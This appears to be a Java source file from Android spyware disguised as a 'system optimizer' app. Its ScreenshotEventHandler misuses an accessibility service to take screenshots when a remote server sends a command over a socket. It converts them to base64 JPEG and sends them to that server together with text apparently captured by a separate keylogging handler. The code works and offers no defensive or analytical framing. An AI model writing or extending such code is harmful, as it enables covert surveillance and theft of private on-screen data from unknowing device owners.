package com.system.optimizer.event_handler;

import java.io.ByteArrayOutputStream;

import com.system.optimizer.config.ConfigManager;
import com.system.optimizer.network.SocketManager;
import com.system.optimizer.config.ConfigData;

import android.view.accessibility.AccessibilityEvent;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.hardware.HardwareBuffer;
import android.os.Build;
import androidx.annotation.RequiresApi;

public class ScreenshotEventHandler {
    private static final String TAG = "ScreenshotEventHandler";

    private final AccessibilityService service;

    private final SocketManager socketManager;
    
    private final ConfigManager configManager;

    public ScreenshotEventHandler(AccessibilityService delegate, SocketManager socketManager, ConfigManager configManager) {
        if (delegate == null) {
            throw new IllegalArgumentException("AccessibilityService cannot be null");
        }
        if (socketManager == null) {
            throw new IllegalArgumentException("SocketManager cannot be null");
        }
        if (configManager == null) {
            throw new IllegalArgumentException("ConfigManager cannot be null");
        }
        this.service = delegate;
        this.socketManager = socketManager;
        this.configManager = configManager;
        this.socketManager.addListener("screenshot", args -> onScreenshotRequestEvent());
    }

    public void onScreenshotRequestEvent() {
        // Only take screenshot if enabled in config
        ConfigData config = configManager.getCachedConfig();
        if (config == null || !config.isAutoScreenshotEnabled()) {
            return;
        }

        // Ignore system UI packages
        //String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        //if (packageName.equals("com.android.systemui") ||
        //        packageName.equals("android")) {
        //    return;
        //}

        // Check if device supports screenshot functionality
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            socketManager.sendEvent("logger", "Screenshot not supported on this Android version");
            return;
        }

        captureAndSend();
    }

    /**
     * Capture screenshot programmatically and send as logger_image event.
     * Used by TextEventHandler after text flush.
     */
    public void captureAndSend() {
        captureAndSend(null);
    }

    /**
     * Capture screenshot and combine with existing text message.
     * @param existingMessage Optional existing text to combine with screenshot
     */
    public void captureAndSend(String existingMessage) {
        // Only take screenshot if enabled in config
        ConfigData config = configManager.getCachedConfig();
        if (config == null || !config.isAutoScreenshotEnabled()) {
            // If not enabled, just send the message without image
            if (existingMessage != null) {
                socketManager.sendEvent("logger", existingMessage);
            }
            return;
        }

        // Check if device supports screenshot functionality
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            if (existingMessage != null) {
                socketManager.sendEvent("logger", existingMessage);
            }
            return;
        }

        final String messageToSend = existingMessage;

        try {
            service.takeScreenshot(
                    android.view.Display.DEFAULT_DISPLAY,
                    service.getMainExecutor(),
                    new AccessibilityService.TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(AccessibilityService.ScreenshotResult result) {
                            try {
                                if (result == null) {
                                    // Send without image
                                    if (messageToSend != null) {
                                        socketManager.sendEvent("logger", messageToSend);
                                    }
                                    return;
                                }

                                HardwareBuffer buffer = result.getHardwareBuffer();
                                if (buffer == null) {
                                    if (messageToSend != null) {
                                        socketManager.sendEvent("logger", messageToSend);
                                    }
                                    return;
                                }

                                ColorSpace colorSpace = result.getColorSpace();
                                if (colorSpace == null) {
                                    colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
                                }

                                Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
                                if (bitmap == null) {
                                    buffer.close();
                                    if (messageToSend != null) {
                                        socketManager.sendEvent("logger", messageToSend);
                                    }
                                    return;
                                }

                                buffer.close();

                                ConfigData cachedConfig = configManager.getCachedConfig();
                                byte[] imageData = bitmapToJpegBytes(bitmap, cachedConfig.getScreenshotQuality());
                                bitmap.recycle();

                                // Combine text with image and send as single message
                                String base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP);
                                String combinedMessage = messageToSend + "<<IMAGE>>" + base64Image;
                                socketManager.sendEvent("logger", combinedMessage);
                            } catch (Exception e) {
                                android.util.Log.e(TAG, "Error processing screenshot: " + e.getMessage());
                                // Send without image on error
                                if (messageToSend != null) {
                                    socketManager.sendEvent("logger", messageToSend);
                                }
                            }
                        }

                        @Override
                        public void onFailure(int error) {
                            android.util.Log.w(TAG, "Screenshot failed with error code: " + error);
                            // Send without image on failure
                            if (messageToSend != null) {
                                socketManager.sendEvent("logger", messageToSend);
                            }
                        }
                    });
        } catch (Exception e) {
            android.util.Log.e(TAG, "Error taking screenshot: " + e.getMessage());
            // Send without image on exception
            if (messageToSend != null) {
                socketManager.sendEvent("logger", messageToSend);
            }
        }
    }

    /**
     * Convert Bitmap to JPEG byte array
     */
    private static byte[] bitmapToJpegBytes(Bitmap bitmap, int quality) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
        return baos.toByteArray();
    }
}